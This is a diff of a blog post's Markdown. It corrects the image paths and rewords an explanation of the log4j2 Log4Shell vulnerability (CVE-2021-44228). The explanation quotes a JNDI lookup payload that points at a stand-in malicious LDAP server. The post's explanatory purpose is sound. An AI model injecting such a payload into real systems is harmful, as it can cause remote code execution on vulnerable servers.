@@ -10,8 +10,8 @@ keywords:
   - security,
   - vulnerabilities,
   - software engineering
-image: ../img/posts/2020/2022-06-15/satyr-cover.jpg
-share-img: ../img/posts/2020/2022-06-15/satyr-cover.jpg
+image: ../img/posts/2022/2022-06-15/satyr-cover.jpg
+share-img: ../img/posts/2022/2022-06-15/satyr-cover.jpg
 show-avatar: false
 date: 2022/06/15
 author: cesarsotovalero
@@ -31,9 +31,9 @@ TODO
 
 In December 2021, a critical vulnerability was discovered in the popular Java logging library log4j2.
 The versions affected ranged [between 2.0-beta9 and 2.14.1 included](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q). 
-This vulnerability was assigned the identifier [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).
+This vulnerability is identified by [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).
 
-The vulnerability stemmed from the `JndiLookup` class in log4j, which allowed JNDI (Java Naming and Directory Interface) lookups. 
+The vulnerability stemmed from the `JndiLookup` class in log4j, which allowed JNDI ([Java Naming and Directory Interface](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html#:~:text=The%20Java%20Naming%20and%20Directory,any%20specific%20directory%20service%20implementation.)) lookups. 
 When log4j is configured to log unsanitized user input, an attacker can insert a malicious string (like `${jndi:ldap://malicious.server/payload}`) which would cause log4j to initiate a JNDI lookup.
 This can lead to Remote Code Execution (RCE) because certain JNDI services, like LDAP, can return serialized Java objects, allowing the attacker to run arbitrary code on the affected server.
 
